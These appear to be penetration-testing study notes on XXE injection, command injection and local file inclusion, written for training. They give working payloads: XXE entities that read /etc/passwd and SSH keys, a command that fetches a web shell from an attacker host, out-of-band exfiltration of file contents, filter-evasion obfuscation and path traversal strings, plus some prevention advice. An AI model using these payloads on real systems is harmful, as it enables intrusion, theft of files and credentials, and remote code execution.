<!DOCTYPE email SYSTEM "http://domain.com/email.dtd">

```

In XML DTDs, custom entities (XML variables) can be defined to allow the refactoring of variables and reduce repetitive data. This can be done with the use of the ENTITY keyword, which is followed by the entity name and its value, as follows:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Company Name">
]>

```
Once an entity is defined, it can be referenced in an XML document between an & and a semi-colon ;  (i.e., `&company;`). **External XML Entities** can be referenced with the SYSTEM keyword as well. The PUBLIC keyword can be used instead of the SYSTEM keyword for loading external resources, which is used with publicly declared entities and standards:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>

```

This works similarly to internal XML entities defined within documents, as an external entity can be referenced between an & and ;. When the XML file is parsed on the server-side, in cases like SOAP (XML) APIs or web forms, then an entity can reference a file stored on the back-end server, which may eventually be disclosed to the attacker when they reference the entity.

<a id="identifyingxxewebattcks"></a>

##### **`Identifying XXE Injections`**

When a web application trusts unfiltered XML data from user input, an attacker may be able to reference an external XML DTD document and define new custom XML entities. If new entities can be defined and displayed on the web page, an attacker should be able to define external entities and make them reference a local file, which, when displayed, shows the content of that file on the back-end server. 

The first step in identifying potential XXE vulnerabilities is finding web pages that accept an XML user input; therefore, these user input requests should be intercepted. If the page sends the user input in an XML format to the web server, this will be a potential XXE testing target. If the web application uses outdated XML libraries, and it does not apply any filters or sanitization on the XML input, it may be exploitable to read local files. 
* Once intercepting the request, send it to Burp Repeater and send it without any modifications to **determine which element is displayed back on the browser**
* To print the content of an external file to the page, note which elements are being displayed to know which elements to inject into. 
   * In some cases, no elements may be displayed, which will be covered in the **advanced file disclosure** section

For example, the following web request contains XML data and responds with `Check your email email@email.com` meaning the email element is potentially vulnerable:
```xml
<?xml version="1.0" encoding="UTF-8"?>
   <root>
      <name>
         test
      </name>
      <tel>
      </tel>
      <email>
      email@email.com
      </email>
      <message>
      test1
      </message>
   </root>

```
Once the element(s) that are displayed are determined, define a new entity based on that element and use it as a variable in the element to see whether it gets replaced with the defined value. 
* In this example, the XML input in the web request had no DTD being declared within the XML data itself, or being referenced externally, so a new DTD should be added before defining the entity
   * If the DOCTYPE was already declared in the XML request, the ENTITY element would be added to it

As the *email* element reflects back to the user, the following XML can be input to create a new entity based on that element:
```xml
<!DOCTYPE email [
  <!ENTITY company "new value">
]>

```
This would be placed below the first line of the original XML input. If successful, this would create an XML entity called company, which can be referenced by `&company;` in the potentially vulnerable element:
```xml
<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE email [
   <!ENTITY company "new value">
   ]>
   <root>
      <name>
         test
      </name>
      <tel>
      </tel>
      <email>
      &company;
      </email>
      <message>
      test1
      </message>
   </root>

```
After sending the modified XML data, determine whether the value of the defined entity is displayed. If the response reads "Check your email new value," the web application is vulnerable to XXE.
* A non vulnerable web application would display `&company;` as a raw value

It is important to note that some web applications may default to a JSON format in HTTP request, but still accept other formats, including XML. Even if a web app sends requests in a JSON format, the **Content-Type header** can be changed to **application/xml**, and then convert the JSON data to XML
* If this works, then test the web app against XXE vulnerabilities

<a id="xxelocalfiledisc"></a>

##### **`Local File Disclosure`**

**<u>Reading Sensitive Files</u>**

Once it is confirmed that new internal XML entities can be defined, attempt defining external XML entities. This requires the SYSTEM keyword followed by the external reference path definition:
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```
Put together with the original vulnerable request, the following web request would disclose the /etc/passwd file:
```xml
<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE email [
   <!ENTITY company SYSTEM "file:///etc/passwd">
   ]>
   <root>
      <name>
         test
      </name>
      <tel>
      </tel>
      <email>
      &company;
      </email>
      <message>
      test1
      </message>
   </root>
```
This attack can be expanded to read the content of other sensitive files, like configuration files that may contain passwords or other sensitive files like an id_rsa SSH key of a specific user, which may grant an attacker access to the back-end server. It is important to note that in certain Java web applications a directory may be specified instead of a file, which can be useful for locating other sensitive files

<br>

**<u>Reading Source Code</u>**

Local file disclosure also gives the ability to obtain the source code of the web application, allowing an attacker to perform whitebox pentesting to unveil more vulnerabilities in the web app, or at the very least reveal secret configurations like database passwords or API keys. In this case, try the include the index page first. For PHP web applications, this would just be `index.php`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE email [
   <!ENTITY company SYSTEM "file:///index.php">
   ]>
   <root>
      <name>
         test
      </name>
      <tel>
      </tel>
      <email>
      &company;
      </email>
      <message>
      test1
      </message>
   </root>

```
For the most part, this will not work because the referenced file is not in a proper XML format, so it fails to be referenced as an external XML entity. If a file contains some of XML's special characters (i.e., `</>` `&` `;`), it would break the external entity reference and not be used for the reference. Furthermore, binary data cannot be read because it would also not conform to the XML format. In the case of PHP web applications, **PHP wrapper filters** can be used to base64 encode certain resources and include the files. The following can be used to include the base64-encoded file:
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>

```
Combined with the rest of the vulnerable XML form, this will yield the base64 encoded string of the index.php file. 

<br>

**<u>RCE with XXE</u>**

The easiest way to gain RCE would be to look for ssh keys, or attempt to use a hash stealing trick in Windows-based web applications, by making a call to the local server. If these do not work, it still may be possible to execute commands on a PHP-based web app through the `php://expect` filter, though this requires the PHP expect module to be installed and enabled. 

If the XXE directly prints its output, then an attacker can execute basic commands as `expect://id`, and the page should print the command output; however, if an attacker did not have access to the output, or needed to execute a more complicated command (i.e., reverse shell), then the XML syntax may break and the command may not execute. 

The most efficient method to turn XXE into RCE is by fetching a web shell from the local server and writing it to the web app, and then interacting with it to execute commands. To do so, a basic PHP web shell can be written and a local python web server can be started:
```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php

sudo python3 -m http.server 80

```
At this point, the following XML code can be used to execute a curl command that downloads the webshell into the remote server:
```xml
<!DOCTYPE email [
<!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>

```
Notice how all of the spaces in the XML code are replaced with `$IFS`, as it avoids breaking the XML syntax. Similarly, other characters like `|`, `>`, and `{` may break the code, so they should not be used. Once the request is sent, the local machine should receive a request for the shell.php after which the attacker can interact with the web shell on the remote server for code execution. 

It is important to note that the expect module is not enabled/installed by default on modern PHP servers, so this attack may not always work. This is why XXE is usually used to disclose sensitive local files and source code, which may reveal additional vulnerabilities or ways to gain RCE. 

To get the SSH private key of a user, the XXE injection would appear as follows:
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///home/user/user/.ssh/id_rsa'">
]>

```

For Windows, the syntax is a bit different, but like Linux machines, the names of the users are required to get a private key:
```xml
<!DOCTYPE root [<!ENTITY test SYSTEM 'file: ///c:windows\win.ini'>]>

<!DOCTYPE root [<!ENTITY test SYSTEM 'file: ///C:\windows\system32\drivers\etc\hosts'>]>
            
<!DOCTYPE root [<!ENTITY test SYSTEM 'file: ///c:\users\user\.ssh\id_rsa'>]>
```

##### **`Advanced File Disclosure`**

**<u>Advanced Exfiltration with CDATA</u>**

While PHP filters can only be used for PHP web applications, there are other methods to extract any kind of data (including binary data) for any web application back-end. To output data that does not conform to the XML format, the content of the external file reference can be wrapped with a `CDATA` tag (i.e., `<![CDATA[ FILE_CONTENT ]]>`).

One way to tackle this issue would be to define a begin internal entity with the CDATA tag, and then place the external entity file in between. Doing so will consider the element a CDATA element:
```xml
<!DOCTYPE email [
   <!ENTITY begin "<![CDATA[">
   <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
   <!ENTITY end "]]>">
   <!ENTITY joined "&begin;&file;&end;">
]>

```
After that, if the `&joined;` entity is referenced, it should contain the escaped data; however, this will not work because XML prevents joining internal and external entities. To bypass this limitation, **XML Parameter Entities** must be used, which are a special type of entity that starts with a `%` character and can only be used within the DTD. If referencing a parameter entity from an external source (i.e., a local server), then all of the parameter entities would be considered external and can be joined, as follows:
```xml
<!ENTITY joined "%begin;%file;%end;">

```
Notice the change in syntax from `&` to `%`. At this point, a file can be included by storing the  previous line in a DTD file (i.e., xxe.dtd), host it on a local machine, then reference it as an external entity on the target web application, as follows:
```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000

```
Now, the external entity (xxe.dtd) can be referenced and the previously defined `&joined;` entity will be printed, which should contain the content of the included file (in this case submitDetails.php):
```xml
<!DOCTYPE email [
   <!ENTITY % begin "<![CDATA[">
   <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
   <!ENTITY % end "]]>">
   <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
   %xxe;
]>
...
<email>&joined;</email>

```
If done successfully, this will output the source code of the file directly on Burp. In some modern web servers, it may not be possible to read some files as the web server would be preventing a DOS attack caused by file/entity self-reference (i.e., XML entity reference loop). To make it clear, this does not spawn a reverse shell, it just allows a file to be included by externally referencing it from the local machine

<br>

**<u>Error Based XXE</u>**

Sometimes, a web application that uses XML may not write any output, so it will be impossible to control any of the XML input entities to write its content. In these cases, the attacker would be blind to the XML output and would be unable to retrieve the file content using the aforementioned methods. 

If the web application displays runtime errors (i.e., PHP errors) and does not have proper exception handling for the XML input, then this flaw can be used to read the output of the XXE exploit. Regardless, if none of the XML input entities are displayed on the screen, first try to send malformed XML data to see if the web application displays any errors. Try any of the following
* Delete any of the closing tags
* Change one of the tags: `<roo>` instead of `<root>`
* Reference a non-existing entity
```xml
<?xml version="1.0" encoding="UTF-8"?>
   <root>
      <name>
      </name>
      <tel>
      </tel>
      <email>
      &nonExistingEntity;
      </email>
      <message>
      </message>
   </root>

```
If sending the malformed XML data causes the web application to display an error, other file content can be exfiltrated. To do so, the first thing that must be done is to host a DTD file that contains a payload that references a file on the remote server, as follows:
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">

```
This payload defines the file parameter entity and then joins it with an entity that does not exist. In this case, `%nonExistingEntity;` does not exist, so the web application would throw an error saying that this entity does not exist, along with the joined `%file;` as part of the error. There are many other variables that can cause an error, like a bad URI or having bad characters in the referenced file. At this point, the external DTD script can be called from the web server and the error entity can be referenced, as follows:
```xml
<!DOCTYPE email [ 
   <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
   %remote;
   %error;
]>
```
> Only this part would be included in the web request, the other XML header would not be sent. 

This method can also be used to read the source code of files; all that needs to be done is to change the file name in the DTD script to point to the file that is to be read; however, this method is not as reliable as the previous methods for reading source files, as it may have length limitations and certain special characters may still break it. 

<a id="xxeblinddataexfil"></a>

##### **`Blind Data Exfiltration`**

Blind Data Exfiltration

In a completely blind situation, the attacker will neither get the output of any of the XML entities nor any errors in injecting XXE. For these cases, **`Out-of-band (OOB) Data Exfiltration`** can be used, which is often used in similar blind cases with many web attacks, like blind SQLi, blind command injections, and blind XSS. In the *Advanced File Disclosure section*, an out-of-band attack was used because the DTD file was hosted on the local machine and caused the web application connect to it. In OOB data exfiltration, however, instead of having the web application output the file entity to a specific XML entity, the web application sends a web request to the local machine with the included file. 

To achieve this, use a parameter entity for the content of the file to read while using a PHP filter to base64 encode it. After, create another external parameter entity and reference it to the local machine and place the file parameter value as part of the URL being requested over HTTP, as follows:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">

```
If, for example, the intended file had the content of XXE_SAMPLE_DATA, then the file parameter would hold its base64 encoded data (WFhFX1NBTVBMRV9EQVRB). When the XML tries to reference the external OOB parameter from the local machine, it will request `http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB`. Finally, decode the WFhFX1NBTVBMRV9EQVRB string to get the content of the file. Within the same directory as the xxe.dtd file (xml above), the following PHP script can be written to detect the encoded file content, decode it, and output it to the terminal:
```php
<?php
if(isset($_GET['content'])){
   error_log("\n\n" . base64_decode($_GET['content']));
}
?>

```
Once this is written, a PHP server can be started: 
```bash
php -S 0.0.0.0:8000

```
After everything is set up, the payload needs to be written in the web request. In this case, `<root>&content;</root>` needs to be added, as it references the entity and sends the request to the local machine with the file content:
```xml
<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE email [ 
   <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
   %remote;
   %oob;
   ]>
   <root>
      &content;
   </root>

```
In addition to storing the base64 encoded data as a parameter to the URL, a DNS OOB Exfiltration can be used by placing the encoded data as a subdomain for the local machine's URL (ENCODEDTEXT.my.website.com), then a tool like tcpdump can be used to capture any incoming traffic and decode the sub-domain string to get the data. 

<br>

**<u>XXE Automation</u>**

[XXEinjector](https://github.com/enjoiz/XXEinjector) can be used to automate the XXE process. To use this tool, first copy the HTTP request from Burp and write it to a file. Do not include the full XML data, only the first line, and write XXEINJECT after it as a position locator for the tool, as follows:
```html
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT

```
Now the tool is ready to use. First, the following flags are required:
* `--host/--httpport` flags are the IP and port
* `--file` flag is the file of the copied web request (above)
* `--path` flag is the file that is to be read
* `--oob=http` and `--phpfilter` flags are used to perform the OOB attack
```bash
 ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
 
 ```
The tool does not directly print the data as it is base64 encoded. In any case, all exfiltrated files get stored in the logs folder under the tool.

<a id="commandinjections"></a>

### **`Command Injections`**

A **`Command Injection`** vulnerability allows attackers to execute system commands directly on the back-end hosting server, which could lead to compromising the entire network. If a web app uses user-controlled input to execute a system command on the back-end server to retrieve and return specific output, attackers may be able to inject a malicious payload to subvert the intended command and execute the attacker's command. The following are some of the most common types of injections:

* **`OS Command Injection`:** Occurs when user input is directly used as part of an OS command

* **`Code Injection`:** Occurs when user input is directly within a function that evaulates code

* **`SQL Injections`:** Occurs when user input is directly used as part of a SQL query

* **`Cross-Site Scripting/HTML Injection`:** Occurs when exact user input is displayed on a web page

Whenever user input is used within a query without being properly sanitized, it may be possible to escape the boundaries of the user input string to the parent query and manipulate it to change its intended purpose. When it comes to OS Command injections, the controlled user input must directly or indirectly go into a web query that executes system commands. All web programming languages have different function that enable the develop to execute OS commands directly on the back-end server whenever they need to. This may be used for various purposes, like installing plugins or executing certain applications. 

Command injection vulnerabilities are not unique to web apps but can also affect other binaries and thick clients if they pass unsanitized user input to a function that executes system commands, which can also be exploited with the following command injection methods.

<a id="cmdinjdetection"></a>

#### **`Detection`**

The process of detecting basic OS command injection vulnerabilities is the same process for exploiting them. If the command output changes from the intended usual result, then the vulnerability has been successfully exploited. For more advanced command injection vulnerabilities, various fuzzing method or code reviews to identify potential command injection vulnerabilities can be used. The following, however, focuses on basic command injections.

To inject an additional command to the intended one, the following operators may be used:

<center>

|Injection Character|URL-Encoded Character|Executed Command|
|-------------------|---------------------|----------------|
|`;`|`%3b`|Both|
|`\n`|`%0a`|Both|
|`&`|`%26`|Both (second output generally shown first)|
|`\|`|`%7c`|Both (only second output is shown)|
|`&&`|`%26%26`|Both (only if first succeeds)|
|`\|\|`|`%7c%7c`|Second (only if first fails)|
|``|`%60%60`|Both (Linux-only)|
|`$()`|`%24%28%29`|Both (Linux-only)|

</center>

> The last two are sub-shells for Linux; the injected command would be wrapped with these operators

Any of the previous operators can be used to inject another command so both or either of the commands get executed. The expected input would be written, then any of the above operators followed by the new command. In general, for basic command injection, all of these operators can be used for command injections regardless of the web app language, framework, or back-end server. 

<a id="cmdinjbypassingfevalid"></a>

#### **`Bypassing Front-End Validation`**

It is common for developers to only perform input validation on the front-end while not validating or sanitizing the input on the back-end. However, front-end validations are usually not enough to prevent injections, as they can be easily bypassed by sending customer HTTP requests directly to the back-end. 

The easiest method to customize the HTTP requests being sent to the back-end server is to use a web proxy that can intercept the HTTP request being sent by the application. This can be done via Burp to proxy the traffic through them. 
1. Capture request
2. Customize HTTP request to include command injection. The payload should be URL-encoded to ensure that it gets sent.

<a id="cmdinjidentfilters"></a>

#### **`Identifying Filters`**

Another type of injection mitigation is using blacklisted characters and words on the back-end to detect injection attempts and deny the request if any request contained them. Another layer is using WAFs, which may have a broader scope and various methods of injection detection and prevent other attacks, like SQLi or XSS. The following provides examples of how command injections may be detected and blocked, and how attackers can identify what is being blocked. 


If the command injection yields an error message, then something was sent that triggered a security mechanism in place that denied the request. If the error message is is shown where the output is displayed, then it was prevented by the PHP web app itself. **If the error message displayed a different page, with information like the attacker's IP and the request, this may indicate that it was denied by a `WAF`**. 

A web app may have a list of blacklisted characters, and if the command contains them, it would deny the request. If the web app was written in PHP, the code may look like:
```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```
Before attempting to bypass the **`filter`**, try to identify which character or command caused the denied request. Once identified, try using all of the other command injection operators. 

<a id="cmdinjbypasspacefilters"></a>

#### **`Bypassing Space Filters`**

The **new-line (`\n`)** character is not usually blacklisted, as it may be needed in the payload itself, so it should also be attempted. This injection operator works in appending commands, both in Linux and Windows. 

Besides this, a **space character is often blacklisted and is crucial to some command injection attacks;** however, it can be bypassed in many cases. 

Using **`tabs` (`%09`) instead of spaces is a technique that may work,** as both Linux and Windows accept commands with tabs between arguments, and they are executed the same. 
```bash
ip=127.0.0.1%0a%09whoami
```

The Linux Environment Variable, **(`$IFS`)** may also work since its default value is a space and a tab, which would work between command arguments. If `${IFS}` is placed where the spaces should be, the variable should automatically replace the space and the command should work.
```bash
ip=127.0.0.1%0a${IFS}whoami
```

Finally, the **`Bash Brace Expansion`** feature can be used in lieu of spaces. This automatically adds spaces between arguments wrapped between braces:
```bash
ip=127.0.0.1%0a{ls,-la}
```

<a id="cmdinjbypassothblkchar"></a>

#### **`Bypassing Other Blacklisted Characters`**

Besides injection operators and space characters, both slashes are often blacklisted. There are several techniques to produce any character desired while avoiding the use of blacklisted characters. 

**<u>Linux</u>**

One technique for replacing slashes (or any other character) is through **`Linux Environment Variables`.** While `${IFS}` is directly replaced with a space, there's no environment variable for slashes or semi-colons; however, these characters may be used in an environment variable. The start and length of the string can be specified to exactly match this character. For example, the $PATH environment variable in linux can be used. First, look at what it would output:
```bash
echo ${PATH}

> /usr/local/bin:/usr/bin:/bin:/usr/games
```
* If starting at the 0 character, and only taking a string of length 1, the `/` will be taken. 
  * The `${PATH}` environment variable can be used in payloads to specify certain characters:
```bash
echo ${PATH:0:1}

> /
```

The same can be done with the `$HOME` or `$PWD` environment variables too. This same concept can be done to get the semi-colon character:
```bash
echo ${LS_COLORS:10:1}

> ;
```

> These environment variables can be combined in a payload to bypass a filter

<br>


**<u>Windows</u>**

To produce a slash in Windows Command Line (CMD), a Windows variable can be echoed (`%HOMEPATH%`), specify a starting position (`~6`), and specify a negative end position (`-11`). Of course, first type %HOMEPATH% in PowerShell to see the entire string to determine the starting and end position:
```powershell
echo %HOMEPATH:~6,-11%

> \
```

With PowerShell, because a word is considered an array, the index of the needed character can be specified. If only one character is needed, there is no need to specify the start and end positions:
```powershell
$env:HOMEPATH[0]

> \
```

<br>

**<u>Character Shifting</u>**

There are other techniques to produce the required characters without using them, like shifting characters. For example, the following Linux command shifts characters by 1. So, find the character in the ASCII table that is just before the needed character, then add it instead of `[` in the below example. This way, the last printed character would be the one required:
```bash
man ascii     # \ is on 92, before it is [ on 91

echo $(tr '!-}' '"-~'<<<[)

> \
```

<a id="cmdinjbypassblkcmds"></a>

#### **`Bypassing Blacklisted Commands`**

A command blacklist usually consists of a set of words, and if these commands can be obfuscated to make them look different, it may be possible to bypass the filters. The following are a few basic techniques that may enable attackers to change the look of the command to bypass filters manually.

**<u>Linux & Windows</u>**

A common and easy obfuscation technique is **inserting certain characters within the command that are usually ignored by command shells** like Bash and PowerShell, and will execute the same command as if they were not there. The easiest to use are quotes, and they work on both Linux and Windows servers:
```bash
w'h'o'am'i

w"h"o"am"i
```

> Attackers are unable to mix types of quotes and the number of quotes must be even. Of course, the other filters, once URL encoded, can also be combined with these command bypass techniques

<br>

**<u>Linux Only</u>**

There are Linux-only characters that can be input in the middle of commands; the Bash shell would ignore them and execute the command. These characters include the **backslash `\`** and the **positional parameter character `$@`.** This works as it did with the quotes, but the number of characters do not have to be even:
```bash

who$@ami

w\ho\am\i
```

<br>

**<u>Windows Only</u>**

There are Windows-only characters that can be inserted in the middle of commands that do not affect the outcome, like a **caret `^`** 
```powershell
who^ami
```

<a id="cmdinjadvcmdobfus"></a>

#### **`Advanced Command Obfuscation`**

**<u>Case Manipulation</u>**

**Case Manipulation** inverts the character cases of a command or alternates between cases. This usually works because a command blacklist may not check for different case variations of a single word.

If dealing with a Windows server, the casing of the characters of the command can be changed and sent. In Windows, commands for PowerShell and CMD are case-insensitive, meaning they will execute the command regardless of what case it is written in:
```powershell
WhOaMi
```

Because Linux is case-sensitive, case-manipulation will not work. The following turns the command into an all-lowercase word.  The following can be used:
```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```
* This command uses `tr` to replace all upper-case characters with lower-case characters, which results in an all lower-case character command. 

If the web app filters spaces, this command will get blocked, however. Replace the spaces with tabs `%09` before inputting it through Burp:
```bash
ip=127.0.0.1%0a(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
```

The following is another technique that does the same:
```bash
$(a="WhOaMi";printf %s "${a,,}")
```
> Remember to bypass the blacklisted characters 

<br>

**<u>Reversed Commands</u>**

**Reversed Commands** include having a command template that switches the commands back and executes them in real-time. This includes creating Linux/Windows commands that eventually execute the command without containing the actual command words:
```bash
echo 'whoami' | rev
```

After getting the output (imaohw), the original command can be executed by **reversing it back in a sub-shell `($())`:**
```bash
$(rev<<<'imaohw')
```

For **Windows,** a string can be reversed as follows:
```powershell
 "whoami"[-1..-20] -join ''
```

After getting the output (imaohw), the reverse string can be **executed with a Powershell sub-shell `(iex "$()")`:**
```powershell
iex "$('imaohw'[-1..-20] -join '')"
```

<br>

**<u>Encoded Commands</u>**

Using **Encoded Commands** makes it less likely to be denied by a filter or a WAF. The created command will be unique to each case, depending on what characters are allowed and the level of security on the filter. `Base64` or `xxd` (for hex encoding) can be used. 

**1. Encode the payload that should be executed; including filtered characters:**
```bash
echo -n 'cat /etc/passwd | grep 33' | base64
```

**2. Create a comand that will decode the encoded string in a sub-shell `($())`, and then pass it to bash to be executed (`bash<<<`):**
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

> `<<<` is used instead of pipe `|`, as it is often a filtered character


**3. Replace the spaces to execute the same command through command injection**
```bash
ip=127.0.0.1%0abash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

> Even if some commands were filtered, like bash or base64, the filter could be bypassed by using the aforementioned techniques, or other alternatives can be used, like sh for command execution and openssl for b64 decoding, or xxd for hex decoding

<br>

The same techniques can be done with Windows:

**1. Use base64 to encode the string**
```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
```

On a side note, the same can be done on Linux, but the string would have to be converted from UTF-8 to UTF-16 before it is base64'd:
```bash
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```

**2. Deocde the b64 string and execute it with a PS sub-shell `(iex "$()")`:**
```powershell
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

Other techniques can be found on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion)
* Also, look for automated obfuscation tools
  * **Linux:** `Bashfuscator`
  * **Windows:** `DOSfuscation`

<a id="cmdinjprev"></a>

#### **`Command Injection Prevention`**

**<u>System Commands</u>**

Avoid using functions that execute system commands, especially if there is user input. Even when not directly inputting user input into these functions, a user may be able to indirectly influence them, which may eventually lead to a command injection vulnerability.

Instead of using system command execution functions, **built-in functions that perform the needed functionality** should be used, as back-end languages usually have secure implementations of these types of functions. 
* If no built-in function is found to perform a functionality, never directly use the user input with these functions, but always validate and sanitize the user input on the back-end
* Limit the use of these types of functions, only using them when there's no built-in alternative to the required functionality.

<br>

**<u>Input Validation</u>**

Whether using built-in function or system command execution functions, always **validate and then sanitize the user input.** Input validation is done to ensure it matches the expected format for the input, such that the request is denied if it does not match. This should be done both on the front- and back-end. 


In PHP, like many other web development languages, there are built-in filters for a variety of standard formats, like emails, URLs, and even IPs, which can be sued with the `filter_var` function:
```php
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    // call function
} else {
    // deny request
}
```

If validating a different non-standard format, then `regex` with the `preg_match` function should be used. 

<br>

**<u>Input Sanitization</u>**

The most critical part for preventing any injection vulnerability is **input sanitization,** which means removing any non0necessary special characters from the user input. Input sanitization is always performed after input validation. Even after the provided user input is validated to be in the proper format, sanitization should be performed to remove any special characters that are not required for the specific format, as there are cases where input validation may fail (i.e., bad regex).

Blacklisting certain words is generally not enough to prevent injections; built-in functions should be used to remove any special characters. In PHP, the `preg_replace` function can be used to remove any special characters from the user input:
```php
$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);
```
* In this case, regex only allows alphanumerical characters (A-Za-z0-9) and allows a dot character as required for IPs. Any other character will be removed from the string. 

The same can be done with JS:
```js
var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
```

The DOMPurify library for a NodeJS back-end can also be used:
```js
import DOMPurify from 'dompurify';
var ip = DOMPurify.sanitize(ip);
```

In certain cases, all special characters may be allowed. In PHP, The `filter_var` function should be used for input validation, and the `escapeshellcmd` filter can be used to escape any special characters so that they cannot be cause any injections. For NodeJS, the `escape(ip)` function can be used; however, escaping special characters is not considered a secure practice, as it may be bypassed through various techniques. 

<br>

**<u>Server Configuration</u>**

The back-end server should be securely configured to reduce the impact in the event of a webserver being compromised. Some of the configurations that may be implemented include:

* Use the web server's built-in WAF (i.e., Apache mod_security) in addition to an external WAF

* Abide by the **Principle of Lease Privilege** by running the web server as a low privileged user (www-data)

* Prevent certain functions from being executed by the web server

* Limit the scope accessible by the web application to its folder

* Reject double-encoded request and non-ASCII characters in URLs

* Avoid the use of sensitive/outdated libraries and modules

<a id="fileinclusion"></a>

### **`File Inclusion`**

Modern back-end languages, like PHP, JS, or Java, use HTTP parameters to specify what is shown on the web page. These HTTP parameters allow for building dynamic web pages, reducing overall script sizes, and simplifies code. In such cases, parameters are used to specify which resource is shown on the page. If such functionalities are not securely coded, an attacker may manipulate these parameters to display the content of any local file on the hosting server, leading to a **`Local File Inclusion (LFI)`.** 


The most common place to find LFI is within **templating engines.** In order to have most of the web application looking the same when navigating between pages, a templating engine displays a page that shows the common static parts, such as the header, navigation bar, and footer, and then dynamically loads other content that changes between pages. Otherwise, every page on the server would need to be modified when changes are made to any part of the static parts. 
* This is why there are parameters like `/index.php?page=about`, where *index.php* sets static content (header/footer), and then only pulls the dynamic content specified in the parameter, which in this case may be read from a file called *about.php*.
   * If there is control over the *about* portion of the request, it may be possible to have the web application grab other files and display them on the page

<br>

LFI vulnerabilities can lead to **source code disclosure, sensitive data exposure, and even RCE** under certain conditions. Leaking source code may allow attackers to test the code for other vulnerabilities, which may reveal previously unknown vulnerabilities. Furthermore, leaking sensitive data may enable attackers to enumerate the remote server for other weaknesses or even leak credentials and keys that may allow them to access the remote server directly. Under specific conditions, LFI may also allow attackers to execute code on the remote server, which may compromise the entire back-end server and any other servers connected to it. While each of the most popular web servers and development frameworks have a different approach to including local files, they all load a file from a specified path:
* Such a file could could be a dynamic header or different content based on the user-specified language
   * For example, the page may have a `?language GET` parameter, and if a user changes the language from a drop-down menu, then the same page would be returned but with a different language parameter (i.e., ?language=es). In such cases, changing the language may change the directory the web application is loading the pages from (i.e., /en/ or es/). If there is control over the path being loaded, then there may be a vulnerability to read other files and potentially reach RCE

<a id="localfileinclusion"></a>

#### **`Local File Inclusion`**

**<u>Basic LFI</u>**

If the web application is pulling a file that is being included in the page, a hacker may be able to change the file being pulled to read the content of a different local file. Two common readable files that are available on most back-end servers are:

1. **Linux: `/etc/passwd`**
2. **Windows: `C:\Windows\boot.ini`**

Because of this, depending on the server architecture, the parameter of a website hosted on Linux server can be changed to:
```bash
index.php?language=/etc/passwd
```
* If the page is vulnerable, it may be possible to read the content of the passwd file and identify what users exist on the back-end server


This example reads a file by specifying its absolute path. This would work if the whole input was used within the `include()` function without any additions, like the following example:
```php
include($_GET['language']);
```
* In this case, if the /etc/passwd file is trying to be read, then the `include()` function would fetch that file directly. This is not so common and obviously insecure, so, path traversal may need to be done. 

<br>


**<u>Path Traversal</u>**

In many occasions, web develops may append or prepend a string to the parameter. For example, the language parameter may be used for the filename, and may be added after a directory, as follows:
```php
include("./languages/" . $_GET['language']);
```
* In this case, if a hacker attempts to read /etc/passwd, then the path passed to `include()` would be `/languages//etc/passwd`, and as this file does not exist, reading the file's contents will not be possible. 

This restriction can be bypassed by **traversing directories using relative paths.** To do so, `../` can be added before a file name, which refers to the parent directory:
```bash
index.php?language=../../../../etc/passwd
```
* For example, if the full path of the languages directory is /var/www/html/languages/, then using ../index.php would refer to the index.php file on the parent directory (i.e., /var/www/html/index.php).

